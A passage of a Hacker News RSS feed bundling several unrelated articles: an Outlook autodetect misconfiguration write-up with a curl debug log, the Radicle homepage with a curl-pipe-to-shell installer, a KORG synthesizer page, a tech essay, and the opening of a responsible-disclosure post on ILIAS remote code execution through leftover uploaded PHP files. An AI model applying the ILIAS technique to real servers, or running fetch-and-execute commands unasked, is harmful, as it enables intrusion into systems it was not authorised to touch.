    &lt;quote&gt;* Host prod.autodetect.outlook.cloud.microsoft:443 was resolved. * IPv6: (none) * IPv4: 172.169.69.94 * Trying 172.169.69.94:443... * Connected to prod.autodetect.outlook.cloud.microsoft (172.169.69.94) port 443 * ALPN: curl offers h2,http/1.1 * (304) (OUT), TLS handshake, Client hello (1): * CAfile: /etc/ssl/cert.pem * CApath: none * (304) (IN), TLS handshake, Server hello (2): * (304) (IN), TLS handshake, Unknown (8): * (304) (IN), TLS handshake, Certificate (11): * (304) (IN), TLS handshake, CERT verify (15): * (304) (IN), TLS handshake, Finished (20): * (304) (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / AEAD-AES256-GCM-SHA384 / [blank] / UNDEF * ALPN: server accepted h2 * Server certificate: * subject: C=US; ST=WA; L=Redmond; O=Microsoft Corporation; CN=autodetect.outlookmobile.com * start date: Nov 1 12:31:46 2025 GMT * expire date: Jan 30 12:31:46 2026 GMT * subjectAltName: host "prod.autodetect.outlook.cloud.microsoft" matched cert's "*.autodetect.outlook.cloud.microsoft" * issuer: C=US; O=Microsoft Corporation; CN=Microsoft Azure RSA TLS Issuing CA 03 * SSL certificate verify ok. * using HTTP/2 * Server auth using Basic with user 'email@example.com' * [HTTP/2] [1] OPENED stream for https://prod.autodetect.outlook.cloud.microsoft/autodetect/detect?app=outlookdesktopBasic * [HTTP/2] [1] [:method: GET] * [HTTP/2] [1] [:scheme: https] * [HTTP/2] [1] [:authority: prod.autodetect.outlook.cloud.microsoft] * [HTTP/2] [1] [:path: /autodetect/detect?app=outlookdesktopBasic] * [HTTP/2] [1] [authorization: Basic ZW1haWxAZXhhbXBsZS5jb206cGFzc3dvcmQ=] * [HTTP/2] [1] [user-agent: curl/8.7.1] * [HTTP/2] [1] [accept: */*] &amp;gt; GET /autodetect/detect?app=outlookdesktopBasic HTTP/2 &amp;gt; Host: prod.autodetect.outlook.cloud.microsoft &amp;gt; Authorization: Basic ZW1haWxAZXhhbXBsZS5jb206cGFzc3dvcmQ= &amp;gt; User-Agent: curl/8.7.1 &amp;gt; Accept: */* &amp;gt; * Request completely sent off &amp;lt; HTTP/2 200 &amp;lt; content-type: application/json; charset=utf-8 &amp;lt; date: Mon, 08 Dec 2025 21:32:58 GMT &amp;lt; server: Kestrel &amp;lt; strict-transport-security: max-age=2592000 &amp;lt; x-olm-source-endpoint: /detect &amp;lt; x-provider-id: seeatest &amp;lt; x-debug-support: eyJkZWNpc2lvbiI6ImF1dG9EdjIgPiBhdXRvRHYxID4gZml4ZWQgZGIgcHJvdmlkZXIgPiBmaXhlZCBkYiBkb21haW4gcHJvdG9jb2xzID4gZGIgcHJvdmlkZXIgPiBkYiBkb21haW4gcHJvdG9jb2xzIiwiYXV0b0QiOnsidjIiOm51bGwsInYxIjpudWxsfSwiZGIiOnsicHJvdmlkZXIiOnsiRG9tYWluSWQiOm51bGwsIklkIjoic2VlYXRlc3QiLCJTZXJ2aWNlIjpudWxsLCJQcm90b2NvbHMiOlt7InByb3RvY29sIjoic210cCIsIkRvbWFpbiI6bnVsbCwiSG9zdG5hbWUiOiJzbXRwZ21zLmpuZXQuc2VpLmNvLmpwIiwiUG9ydCI6NDY1LCJFbmNyeXB0aW9uIjoiU3NsIiwiSXNDcm93ZHNvdXJjZWQiOm51bGwsIkZlZWRiYWNrcyI6bnVsbCwiSW5zZWN1cmUiOm51bGwsIlNlY3VyZSI6IlRydWUiLCJVc2VybmFtZSI6IntlbWFpbH0iLCJWYWxpZGF0ZWQiOmZhbHNlLCJBdXRvZGlzY292ZXIiOm51bGwsIkFhZCI6bnVsbH0seyJwcm90b2NvbCI6ImltYXAiLCJEb21haW4iOm51bGwsIkhvc3RuYW1lIjoiaW1hcGdtcy5qbmV0LnNlaS5jby5qcCIsIlBvcnQiOjk5MywiRW5jcnlwdGlvbiI6IlNzbCIsIklzQ3Jvd2Rzb3VyY2VkIjpudWxsLCJGZWVkYmFja3MiOm51bGwsIkluc2VjdXJlIjpudWxsLCJTZWN1cmUiOiJUcnVlIiwiVXNlcm5hbWUiOiJ7ZW1haWx9IiwiVmFsaWRhdGVkIjpmYWxzZSwiQXV0b2Rpc2NvdmVyIjpudWxsLCJBYWQiOm51bGx9XSwiQ3JlYXRlZEF0IjoiMjAyMC0wMi0wM1QwNTozMToyMy4yOTgwMjQ4IiwiVXBkYXRlZEF0IjoiMjAyMC0wMi0wM1QwOToxMjo1OS4wMjQ1ODciLCJQcmVkaWNhdGVzIjpudWxsLCJBdXRvRHYyRW5kcG9pbnQiOm51bGwsIkNvbW1lbnQiOm51bGwsIkZlZWRiYWNrcyI6bnVsbCwiSXNDcm93ZHNvdXJjZWQiOmZhbHNlfSwiZG9tYWluIjp7ImZpeGVkIjpmYWxzZSwiYXV0b0R2MkVuZHBvaW50IjpudWxsLCJwcm92aWRlcklkIjoic2VlYXRlc3QiLCJwcm90b2NvbHMiOm51bGx9fX0= &amp;lt; x-autodv2-error: ENOTFOUND &amp;lt; x-feedback-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJEIjoiZXhhbXBsZS5jb20iLCJQSSI6InNlZWF0ZXN0IiwiUyI6W10sIlAiOlsiaW1hcHM6Ly9pbWFwZ21zLmpuZXQuc2VpLmNvLmpwOjk5MyIsInNtdHBzOi8vc210cGdtcy5qbmV0LnNlaS5jby5qcDo0NjUiXSwiUFQiOiJpbWFwIHNtdHAiLCJleHAiOjE3NjUyMzMxNzgsImlhdCI6MTc2NTIyOTU3OH0.-ohD7c9hytRZK_b4EJ0M5Tke7hl8u1wjsMYRV71GZik &amp;lt; x-dns-prefetch-control: off &amp;lt; x-frame-options: SAMEORIGIN &amp;lt; x-download-options: noopen &amp;lt; x-content-type-options: nosniff &amp;lt; x-xss-protection: 1; mode=block &amp;lt; x-instance-id: autodetect-deployment-76fffc487d-wfs4b &amp;lt; x-response-time: 3472 ms &amp;lt; x-request-id: f1b6525f-6d11-4add-a0e4-0b677d89f9eb &amp;lt; x-autodetect-cv: f1b6525f-6d11-4add-a0e4-0b677d89f9eb &amp;lt; * Connection #0 to host prod.autodetect.outlook.cloud.microsoft left intact {"email":"email@example.com","services":[],"protocols":[{"protocol":"imap","hostname":"imapgms.jnet.sei.co.jp","port":993,"encryption":"ssl","username":"email@example.com","validated":false},{"protocol":"smtp","hostname":"smtpgms.jnet.sei.co.jp","port":465,"encryption":"ssl","username":"email@example.com","validated":false}]}%&lt;/quote&gt;
    &lt;p&gt;The JSON response:&lt;/p&gt;
    &lt;quote&gt;{ "email": "email@example.com", "services": [], "protocols": [ { "protocol": "imap", "hostname": "imapgms.jnet.sei.co.jp", "port": 993, "encryption": "ssl", "username": "email@example.com", "validated": false }, { "protocol": "smtp", "hostname": "smtpgms.jnet.sei.co.jp", "port": 465, "encryption": "ssl", "username": "email@example.com", "validated": false } ] }&lt;/quote&gt;
    &lt;head rend="h3"&gt;Decoded debug header&lt;/head&gt;
    &lt;p&gt;The &lt;code&gt;x-debug-support&lt;/code&gt; header (Base64-decoded) reveals additional details:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Field&lt;/cell&gt;
        &lt;cell role="head"&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Provider ID&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;seeatest&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Created&lt;/cell&gt;
        &lt;cell&gt;2020-02-03 05:31:23 UTC&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Updated&lt;/cell&gt;
        &lt;cell&gt;2020-02-03 09:12:59 UTC&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;IsCrowdsourced&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;false&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;This misconfiguration has existed for nearly six years and was not crowdsourced. It appears to have been manually added to Microsoft's database.&lt;/p&gt;
    &lt;head rend="h2"&gt;Related&lt;/head&gt;
    &lt;p&gt;❧ 2026-01-01&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731996</guid><pubDate>Fri, 23 Jan 2026 13:04:09 +0000</pubDate></item><item><title>Radicle: The Sovereign Forge</title><link>https://radicle.xyz</link><description>&lt;doc fingerprint="a0671596b436ca2c"&gt;
  &lt;main&gt;
    &lt;p&gt;Radicle is a sovereign {code forge} built on Git.&lt;/p&gt;
    &lt;head rend="h1"&gt;Synopsis&lt;/head&gt;
    &lt;p&gt;Radicle is an open source, peer-to-peer code collaboration stack built on Git. Unlike centralized code hosting platforms, there is no single entity controlling the network. Repositories are replicated across peers in a decentralized manner, and users are in full control of their data and workflow.&lt;/p&gt;
    &lt;p&gt; The Radicle &lt;code&gt;heartwood&lt;/code&gt; repository. Repository ID
  &lt;code&gt;rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5&lt;/code&gt;.
&lt;/p&gt;
    &lt;head rend="h1"&gt;Get started&lt;/head&gt;
    &lt;quote&gt;ð¾ ·&lt;/quote&gt;
    &lt;p&gt;To install Radicle, simply run the command below from your shell, or go to the download page.&lt;/p&gt;
    &lt;code&gt;curl -sSLf https://radicle.xyz/install | sh&lt;/code&gt;
    &lt;p&gt;Alternatively, you can build from source.&lt;/p&gt;
    &lt;p&gt;For now, Radicle only works on Linux, macOS and BSD variants.&lt;/p&gt;
    &lt;head rend="h2"&gt;Radicle Desktop ð¥ï¸&lt;/head&gt;
    &lt;p&gt;For a graphical collaborative experience check out the Radicle Desktop client, as well.&lt;/p&gt;
    &lt;head rend="h1"&gt;How it works&lt;/head&gt;
    &lt;p&gt;The Radicle protocol leverages cryptographic identities for code and social artifacts, utilizes Git for efficient data transfer between peers, and employs a custom gossip protocol for exchanging repository metadata.&lt;/p&gt;
    &lt;head rend="h2"&gt;Your Data, Forever and Secure&lt;/head&gt;
    &lt;p&gt;All social artifacts are stored in Git, and signed using public-key cryptography. Radicle verifies the authenticity and authorship of all data for you.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unparalleled Autonomy&lt;/head&gt;
    &lt;p&gt;Radicle enables users to run their own nodes, ensuring censorship-resistant code collaboration and fostering a resilient network without reliance on third-parties.&lt;/p&gt;
    &lt;head rend="h2"&gt;Local-first&lt;/head&gt;
    &lt;p&gt;Radicle is local-first, providing always-available functionality even without internet access. Users own their data, making migration, backup, and access easy both online and offline.&lt;/p&gt;
    &lt;head rend="h2"&gt;Evolvable &amp;amp; Extensible&lt;/head&gt;
    &lt;p&gt;Radicleâs Collaborative Objects (COBs) provide Radicleâs social primitive. This enables features such as issues, discussions and code review to be implemented as Git objects. Developers can extend Radicleâs capabilities to build any kind of collaboration flow they see fit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modular by Design&lt;/head&gt;
    &lt;p&gt;The Radicle Stack comes with a CLI, web interface and TUI, that are backed by the Radicle Node and HTTP Daemon. Itâs modular, so any part can be swapped out and other clients can be developed.&lt;/p&gt;
    &lt;quote&gt;âââââââââââââââââââââââââââââââââââââ â Radicle CLI ââ Radicle Web â âââââââââââââââââââââââââââââââââââââ âââââââââââââââââââââââââââââââââââââ â Radicle Repository â â ââââââââââ ââââââââââ âââââââââââ â â â code â â issues â â patches â â â ââââââââââ ââââââââââ âââââââââââ â âââââââââââââââââââââââââââââââââââââ¤ â Radicle Storage (Git) â âââââââââââââââââââââââââââââââââââââ âââââââââââââââââââââââââââââââââââââ â Radicle Node ââ Radicle HTTPD â ââââââââââââââââââ¤âââââââââââââââââââ¤ â NoiseXK ââ HTTP + JSON â âââââââââââââââââââââââââââââââââââââ&lt;/quote&gt;
    &lt;head rend="h1"&gt;Contributing&lt;/head&gt;
    &lt;p&gt;Radicle is free and open source software under the MIT and Apache 2.0 licenses. Get involved by contributing code.&lt;/p&gt;
    &lt;head rend="h1"&gt;Updates&lt;/head&gt;
    &lt;p&gt;Follow us on ð Mastodon, ð¦ Bluesky or ð¦ Twitter to stay updated, join our community on ð¬ Zulip, or Subscribe&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.01.2026 Radicle 1.6.0 released. â¨&lt;/item&gt;
      &lt;item&gt;30.09.2025 Radicle 1.5.0 released.&lt;/item&gt;
      &lt;item&gt;04.09.2025 Radicle 1.4.0 released.&lt;/item&gt;
      &lt;item&gt;12.08.2025 Radicle 1.3.0 released.&lt;/item&gt;
      &lt;item&gt;17.07.2025 Radicle 1.2.1 released.&lt;/item&gt;
      &lt;item&gt;13.06.2025 Radicle Desktop is out. ð¥ï¸&lt;/item&gt;
      &lt;item&gt;02.06.2025 Radicle 1.2.0 released.&lt;/item&gt;
      &lt;item&gt;05.12.2024 Radicle 1.1.0 released.&lt;/item&gt;
      &lt;item&gt;10.09.2024 Radicle 1.0.0 released.&lt;/item&gt;
      &lt;item&gt;26.03.2024 Radicle 1.0.0-rc.1 released.&lt;/item&gt;
      &lt;item&gt;10.03.2024 New Radicle homepage.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle Guides launch.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle makes it to the top of Hacker News!&lt;/item&gt;
      &lt;item&gt;18.04.2023 Radicle heartwood is announced.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Blog&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.08.2025 Jujutsu + Radicle = â¤ï¸&lt;/item&gt;
      &lt;item&gt;12.08.2025 Canonical References&lt;/item&gt;
      &lt;item&gt;23.07.2025 Using Radicle CI for Development&lt;/item&gt;
      &lt;item&gt;30.05.2025 How we used Radicle with GitHub Actions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Feedback&lt;/head&gt;
    &lt;p&gt;If you have feedback, join our Zulip or send us an email at feedback@radicle.xyz. Emails sent to this address are automatically posted to our #feedback channel on Zulip.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732213</guid><pubDate>Fri, 23 Jan 2026 13:25:42 +0000</pubDate></item><item><title>KORG phase8 – Acoustic Synthesizer</title><link>https://www.korg.com/us/products/dj/phase8/</link><description>&lt;doc fingerprint="ae7bc2283ab4b732"&gt;
  &lt;main&gt;
    &lt;p&gt;phase8 is an organic, responsive instrument that feels alive in your hands and responds to the world around you.&lt;/p&gt;
    &lt;head rend="h1"&gt;Haptic sound generation through Acoustic Synthesis&lt;/head&gt;
    &lt;p&gt;Acoustic Synthesis uses physically vibrating bodies to generate sound, enhanced with the electronic control you’d expect from a synthesizer. The result is an instrument that produces sound which feels alive and responds to physical interactions such as touch and acoustic feedback. &lt;lb/&gt; It is beyond “analogue vs digital”. It’s even beyond electronics. &lt;lb/&gt;8 independent electromechanical voices with steel resonators are at the heart of the instrument’s acoustic sound.&lt;/p&gt;
    &lt;head rend="h2"&gt;Swapable and tunable steel resonators&lt;/head&gt;
    &lt;p&gt;phase8 comes with 13 chromatically tuned resonators; 8 of your choice can be installed at any one time. Through envelope control, these resonators can produce everything from short percussive sounds to long, drawn-out sustained notes. &lt;lb/&gt;The design allows you to easily swap and tune resonators, letting you customise the scale and character of your phase8.&lt;/p&gt;
    &lt;head rend="h2"&gt;Polymetric rhythm sequencer&lt;/head&gt;
    &lt;p&gt; An intuitive sequencer supports both step programming and unquantized live recording. Each voice offers step skip for polymetric sequencing. &lt;lb/&gt;All sequences can be saved and recalled across 8 memory slots.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modulation modes&lt;/head&gt;
    &lt;p&gt;You can cycle between three distinct amplitude modulation effects: tremolo and two audio rate, pitch-dependent modulation types. The last modulation effect can be optionally harmonically quantised.&lt;/p&gt;
    &lt;head rend="h2"&gt;Trigger delay&lt;/head&gt;
    &lt;p&gt;Using the instrument’s shift knob, you can add delayed triggers to the resonators relative to the selected or synced tempo.&lt;/p&gt;
    &lt;head rend="h2"&gt;Parameter automation&lt;/head&gt;
    &lt;p&gt;All controls on the instrument’s panel can be automated over a sequence using the record function.&lt;/p&gt;
    &lt;head rend="h2"&gt;Real-time interaction&lt;/head&gt;
    &lt;p&gt;Beyond adjusting parameters, phase8 invites physical interaction. Sculpt sound by touching, plucking, strumming, or tapping the resonators – or experiment by adding found objects for new textures. &lt;lb/&gt;The AIR slider lets you boost (or quiet) the acoustic response of whatever you bring in contact with the instrument.&lt;/p&gt;
    &lt;head rend="h2"&gt;External connectivity&lt;/head&gt;
    &lt;p&gt; Both MIDI / USB-MIDI and CV can be used to externally control the knob parameters. &lt;lb/&gt;phase8 can be tempo synchronized to other devices over MIDI / USB-MIDI and Sync. &lt;lb/&gt;External MIDI devices can be used to trigger notes in the Acoustic Synth, and the sequencer can trigger notes in external MIDI instruments over MIDI / USB-MIDI. These connectivity options allow many possibilities for phase8 to integrate into any creative setup.&lt;/p&gt;
    &lt;head rend="h2"&gt;Presale Exclusive Package with Limited Resonators&lt;/head&gt;
    &lt;p&gt;The phase8 presale exclusive package includes three selected limited-edition percussive resonators. Created through experimentation beyond the standard chromatic set, these resonators are designed for open-ended, tactile sound exploration—each offering its own distinctive percussive character. &lt;lb/&gt;Available exclusively as part of the presale package.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732967</guid><pubDate>Fri, 23 Jan 2026 14:34:46 +0000</pubDate></item><item><title>Tech Is Fun Again: The Tech Monoculture Is Finally Breaking</title><link>http://www.jasonwillems.com/technology/2025/12/17/Tech-Is-Fun-Again/</link><description>&lt;doc fingerprint="afa5b35d9a6157f8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Tech is Fun Again: The Tech Monoculture is Finally Breaking&lt;/head&gt;
    &lt;p&gt;Growing up in the 90s and early 2000s, tech was a foundational part of my childhood.&lt;/p&gt;
    &lt;p&gt;I built more physical computers than I can remember. We went from paper maps to GPS (which itself evolved from DVDs with static maps to internet-connected real-time navigation). CD players became MP3 players, then streaming services. We had Palm Pilots and early attempts at “smart” phones, which were anything but. Our computers could search for extraterrestrial life through SETI. We emerged from the pager era to portable phones to the entire internet in our pocket (which evolved from charging per SMS or megabyte to unlimited data plans).&lt;/p&gt;
    &lt;p&gt;We went through what I still think of as a golden era of console gaming: the N64 &amp;amp; PlayStation, then PS2, Xbox, and GameCube. Meanwhile, our bulky CRT monitors became flat (with a misadventure toward “projection” TVs in between). We could buy gadgets for everything. Best Buy and RadioShack felt like amusement parks we’d visit without intention, ready to be drawn in by something new. A trip to Asia’s electronics stores felt like a genuine step into the future.&lt;/p&gt;
    &lt;p&gt;Today, we have everything we did back then, and much more. And yet it somehow feels like we’ve been left with less.&lt;/p&gt;
    &lt;p&gt;In the early 2000s, tech began a decades-long consolidation. Almost everything we used before became a function of a single device. Objectively, this was an improvement—old VCR interfaces were awful, early MP3 players were clunky, GPS lacked real-time traffic data, and nothing talked to each other. And yet, through that consolidation, something intangible was taken from us.&lt;/p&gt;
    &lt;p&gt;Our devices lost their unique personalities. Phones became our alarm clocks, flashlights, calendars, watches, cameras, GPS units, music players, radios, journals, and gaming devices—all at once. We betrayed our focus in the pursuit of convenience, and the personality of our devices for homogeneity.&lt;/p&gt;
    &lt;p&gt;The benefits were clear to us, but the costs weren’t.&lt;/p&gt;
    &lt;p&gt;This convergence created winner-take-all (and two-player) markets. Console gaming became PlayStation or Nintendo. Phones became Android or iOS. Computers became Mac or Windows. PC gaming became synonymous with Steam. Everything else became a feature inside one of those platforms, with globally synchronized updates making our experiences increasingly uniform, and bland.&lt;/p&gt;
    &lt;p&gt;For a long time, that felt inevitable. But it’s only become clear in retrospect that somewhere in the early 2020s, things started to change.&lt;/p&gt;
    &lt;p&gt;New paradigms are emerging for the first time since mobile. VR is no longer experimental. Early AR is starting to reach consumers. Meta shipped a wearable that normal people actually use, thanks to a clever Ray-Ban partnership (and associated equity stake). 3D printers have become real household products. Wearables are diversifying—smart rings, over-the-counter glucose monitors, connected beds.&lt;/p&gt;
    &lt;p&gt;Meanwhile, Apple’s aggressive push for services revenue has alienated developers and users alike, creating space for alternatives. And nostalgia has revealed itself as massive, underserved economic demand.&lt;/p&gt;
    &lt;p&gt;Gen-Z is buying single-purpose iPods and wired headphones. Pokémon cards are trendy. My friends and I are amassing N64 game collections again. There is a revived appetite for film cameras and Polaroids. Companies are recreating old hardware in modern form—ModRetro’s upcoming FPGA-based M64 plays native N64 cartridges, following their successful Game Boy recreation. They’re now working to bring a “next-gen” CRT monitor to market. The Playdate proved there’s still room for third-party handhelds with their own unique philosophies. Even Nintendo couldn’t resist capitalizing with the re-release of their classic consoles.&lt;/p&gt;
    &lt;p&gt;Design matters again. In our devices, and in our lives. Art Deco is in vogue. Cyberpunk has never been more culturally mainstream. Color is back, and bold.&lt;/p&gt;
    &lt;p&gt;Canon, Sony, and Nikon may have replaced Kodak for professionals, but Leica is thriving again and Kodak Instamatic has gone viral. People want devices that feel personal—leather finishes, physical controls, intentional constraints. For years this expression was limited to phone cases. Now it’s showing up in hardware itself.&lt;/p&gt;
    &lt;p&gt;Tech is starting to resemble the wristwatch market: collaborations, limited editions, exclusivity. A market with many players—emerging companies, niche studios, design-forward brands, and even failing companies—is healthier than one dominated by a few giants.&lt;/p&gt;
    &lt;p&gt;Antitrust pressure has slowed consolidation, opened app distribution, killed the anti-competitive iMessage and AirDrop moats, and made big tech cautious about horizontal expansion. And yet market forces may matter even more. Subscriptions keep multiplying. Advertising creeps into everything. Consolidated platforms are becoming bloated, degrading experiences. Platforms extract value in ways that betray their original philosophies.&lt;/p&gt;
    &lt;p&gt;Apple’s push toward services has been financially successful but culturally damaging. Users are looking elsewhere. It was imperceptible at first, but that sentiment is spreading.&lt;/p&gt;
    &lt;p&gt;Barriers to entry are lower than they’ve been in decades. Software can be deployed in minutes. Hardware is still hard, but 3D printing has revolutionized prototyping and accessible manufacturing services have drastically lowered the cost and time to market. Even the consolidation on the USB-C standard has played a role, allowing switching devices without investing in a new ecosystem.&lt;/p&gt;
    &lt;p&gt;We’ve also grown tired of curation by algorithm. What we watch is shaped by recommendation engines. How we perceive it is influenced by aggregate ratings. I miss wandering through video stores, choosing based on nothing more than a cover. Discovery felt accidental and my opinions felt like my own.&lt;/p&gt;
    &lt;p&gt;Burnout plays a role too. A Timex ad went viral this year: “Know the time without seeing you have 1,249 unanswered emails.” People are gravitating toward rigid, single-purpose experiences that let them fully disengage.&lt;/p&gt;
    &lt;p&gt;Our appetite for alternatives has grown, while they’ve also become easier to create. LLMs and modern tools have lowered the effort required to build things. Side projects are easier to start and finish. Even when large companies offer better experiences on paper, individuals are building alternatives for the joy of it. Some go viral. Consumers end up with more choice.&lt;/p&gt;
    &lt;p&gt;Nothing would have been harder to project than the growth of Linux on the desktop. Integrated platforms seemingly made the Linux philosophy untenable, and yet it may now be growing as a direct result of this decoupling. This was a feature, not a bug.&lt;/p&gt;
    &lt;p&gt;Looking at my own purchases from 2025, the pattern becomes obvious:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TRMNL (a no-distraction e-paper display)&lt;/item&gt;
      &lt;item&gt;Ray-Ban Meta glasses&lt;/item&gt;
      &lt;item&gt;Leica D-LUX&lt;/item&gt;
      &lt;item&gt;Wired headphones&lt;/item&gt;
      &lt;item&gt;Android Pixel Pro (alongside iPhone)&lt;/item&gt;
      &lt;item&gt;ASUS ROG laptop (for CUDA and gaming)&lt;/item&gt;
      &lt;item&gt;Matic AI vacuum&lt;/item&gt;
      &lt;item&gt;Govee programmable lights&lt;/item&gt;
      &lt;item&gt;28 TB Seagate hard drive&lt;/item&gt;
      &lt;item&gt;Bambu Labs P1S 3D printer&lt;/item&gt;
      &lt;item&gt;Kindle (finally retiring my last mini-USB device)&lt;/item&gt;
      &lt;item&gt;Oura Ring&lt;/item&gt;
      &lt;item&gt;Abbott Lingo glucose sensor&lt;/item&gt;
      &lt;item&gt;iPad (single-purpose: as a second MacBook display while traveling)&lt;/item&gt;
      &lt;item&gt;More mechanical watches than I can count (while not tech per se, it does reduce the breadth of the Apple ecosystem)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is more than I’ve bought in the last 5 years, and I’m already excited for 2026. While Meta, Apple, Amazon, and Google still appear in my list, their purposes are narrower for me than in the past, and their presence is often no longer part of a two-player market. To be clear, these companies often make great products that should exist, but they should be easy to use as standalone à la carte offerings, not forced omakase experiences.&lt;/p&gt;
    &lt;p&gt;We’ll never truly recreate the late 80s or mid-90s. SaaS, subscription pricing, and centralized platforms are here to stay. But this feels like the beginning of another golden era—one defined less by consolidation and more by variety, personality, and choice.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733624</guid><pubDate>Fri, 23 Jan 2026 15:26:33 +0000</pubDate></item><item><title>Three RCEs in Ilias Learning Management System</title><link>https://srlabs.de/blog/breaking-ilias-part-2-three-to-rce</link><description>&lt;doc fingerprint="8c738f13a4271280"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Breaking ILIAS #2: Three paths towards RCE&lt;/head&gt;
    &lt;p&gt;We describe three previously unknown vulnerabilities enabling remote code execution (RCE) in versions 8, 9, and 10 of the widely used learning management system ILIAS.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerabilities through our responsible disclosure process.&lt;lb/&gt;With patches now in place, we can share the details here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;In the first blog post of our little ILIAS series, we describe how we uncovered and exploited a stored cross-site scripting (XSS) vulnerability to obtain administrative privileges and RCE in a recent red team engagement.&lt;/p&gt;
    &lt;head rend="h2"&gt;Todayâs walkthrough&lt;/head&gt;
    &lt;p&gt;We explore similar vulnerabilities, all of which lead to RCE. First, we discuss an unauthenticated RCE exploiting the course certification import functionality, which is often found in public spaces of ILIAS instances. Next, we describe two authenticated remote-code-execution vulnerabilities caused by insecure deserialization. Both can be exploited by authorized users and often do not require full administrative rights.&lt;/p&gt;
    &lt;head rend="h1"&gt;1. Unauthenticated RCE (CVE-2025-11344)&lt;/head&gt;
    &lt;p&gt;Prerequisites. Exploitation requires public access to objects which support ILIASâ certificate functionality. An ILIAS âcertificateâ can be issued for achievements such as course completion. To avoid confusion with X.509 certificates, we also use the term âcourse certificateâ in this blog post.&lt;lb/&gt;The following object types are affected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test (cmdNode: &lt;code&gt;qx&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Course (cmdNode: &lt;code&gt;lv&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These objects, when placed in the public section of ILIAS, allow any user with read access (including unauthenticated guests) to interact with the certification editor functionality.&lt;/p&gt;
    &lt;p&gt;The âExerciseâ object shared this vulnerability in the tested v10-beta3, but it was since patched by enforcing a stricter access control in this commit: &lt;code&gt;$this-&amp;gt;checkPermission("write")&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;However, the stable release only enforces &lt;code&gt;$this-&amp;gt;checkPermission("read")&lt;/code&gt; for other object types. Read permissions are typically granted in public contexts.&lt;/p&gt;
    &lt;head rend="h2"&gt;Upload arbitrary files to the web server&lt;/head&gt;
    &lt;p&gt;We start our analysis with the ilCertificateGUI class, which handles certification configuration and export. Due to improper access control in the route processing logic, we are able to directly call actions like certificateEditor() and certificateExportFO() without authentication.&lt;/p&gt;
    &lt;p&gt;These methods are meant to be available only to users with editing rights (which would normally be course or exercise administrators). However, because the upstream controllers (&lt;code&gt;ilRepositoryGUI -&amp;gt; ilObjTestGUI&lt;/code&gt;) do not enforce proper checks, we can reach the certification upload functionality without restrictions.&lt;/p&gt;
    &lt;p&gt;The certification editor includes a feature to import course certificate templates as ZIP files. This is an intended and valid functionality to enable customization. The uploaded ZIP gets extracted and parsed by ilXlsFoParser(), which expects a specific XML format inside the archive.&lt;/p&gt;
    &lt;p&gt;Playing around, we notice something unusual: When the uploaded ZIP lacks the expected structure, the parser throws an exception when the expected XML file cannot be found.&lt;/p&gt;
    &lt;p&gt;The critical detail is that this exception is unhandled. As a result, the cleanup routine, specifically the &lt;code&gt;unlink()&lt;/code&gt; call that removes the unzipped files from disk, is never executed. This leaves all extracted files in a web-accessible subdirectory under &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When we upload a &lt;code&gt;.zip&lt;/code&gt; archive containing a &lt;code&gt;.php&lt;/code&gt; script, upload and extraction succeed, but direct execution of our new &lt;code&gt;.php&lt;/code&gt; file is not possible because all files under the &lt;code&gt;/data/&lt;/code&gt; directory are protected by a global &lt;code&gt;.htaccess&lt;/code&gt; file located in the ILIAS &lt;code&gt;/public/&lt;/code&gt; folder, which is configured as our web serverâs &lt;code&gt;DocumentRoot&lt;/code&gt;. It contains the following directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine on
    RewriteRule ^data/.*/.*/.*$ wac.php [L]
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
